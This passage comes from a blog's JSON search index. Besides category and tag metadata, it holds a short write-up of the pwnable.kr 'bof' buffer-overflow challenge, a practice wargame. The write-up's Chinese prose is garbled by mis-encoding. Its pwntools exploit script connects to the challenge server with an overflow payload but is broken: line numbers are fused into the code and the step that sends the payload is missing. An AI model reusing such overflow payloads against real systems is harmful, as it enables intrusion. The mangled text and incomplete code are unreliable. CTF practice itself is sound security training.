Bottle","slug":"PWN/Pwnable-kr/Toddler-s-Bottle","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/Toddler-s-Bottle/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"bof","slug":"Pwnable_kr/bof","date":"2020-10-15T06:33:21.000Z","updated":"2020-10-19T07:09:44.000Z","comments":true,"path":"2020/10/15/Pwnable_kr/bof/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/15/Pwnable_kr/bof/","excerpt":"","text":"æŸ¥çœ‹ç»™å‡ºçš„cè¯­è¨€æºä»£ç  æ˜¾ç„¶ï¼Œç®€å•çš„ç¼“å†²åŒºæº¢å‡ºï¼Œå°†keyé€šè¿‡ç¼“å†²åŒºæº¢å‡ºè¦†ç›–ä¸º0xcafebabeï¼Œå³å¯é€šè¿‡åˆ¤æ–­æ¡ä»¶ï¼Œæ‰§è¡Œsystemå‡½æ•°ã€‚ IDA32æ‰“å¼€æ–‡ä»¶ ç¼–å†™pythonè„šæœ¬123456from pwn import *io = remote(&#x27;pwnable.kr&#x27;,9000)payload = &#x27;a&#x27;*0x2C + &#x27;junk&#x27; + &#x27;junk&#x27; + p32(0xcafebabe)io.interactive()","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Pwnable.kr","slug":"PWN/Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/"},{"name":"Toddler's Bottle","slug":"PWN/Pwnable-kr/Toddler-s-Bottle","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/Toddler-s-Bottle/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]}],"categories":[{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/Machine-Learning/"},{"name":"TensorFlow","slug":"Machine-Learning/TensorFlow","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/Machine-Learning/TensorFlow/"},{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"AD_World","slug":"PWN/AD-World","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/AD-World/"},{"name":"C","slug":"C","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/C/"},{"name":"Linux","slug":"C/Linux","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/C/Linux/"},{"name":"touch","slug":"C/Linux/touch","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/C/Linux/touch/"},{"name":"Heap","slug":"PWN/Heap","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Heap/"},{"name":"Heap_Attack","slug":"PWN/Heap/Heap-Attack","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Heap/Heap-Attack/"},{"name":"Python","slug":"Python","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/Python/"},{"name":"Web","slug":"Python/Web","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/Python/Web/"},{"name":"Pwnable.kr","slug":"PWN/Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/"},{"name":"Toddler's Bottle","slug":"PWN/Pwnable-kr/Toddler-s-Bottle","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/Toddler-s-Bottle/"},{"name":"AI","slug":"AI","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/AI/"},{"name":"Adversarial sample","slug":"AI/Adversarial-sample","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/AI/Adversarial-sample/"},{"name":"Heap_Basic","slug":"PWN/Heap/Heap-Basic","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Heap/Heap-Basic/"}],"tags":[{"name":"TensorFlow2.0","slug":"TensorFlow2-0","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/TensorFlow2-0/"},{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"},{"name":"Stack","slug":"Stack","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/Stack/"},{"name":"C","slug":"C","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/C/"},{"name":"Linux","slug":"Linux","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/Linux/"},{"name":"Python","slug":"Python","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/Python/"},{"name":"Nmap","slug":"Nmap","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/Nmap/"},{"name":"AI","slug":"AI","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/AI/"}]}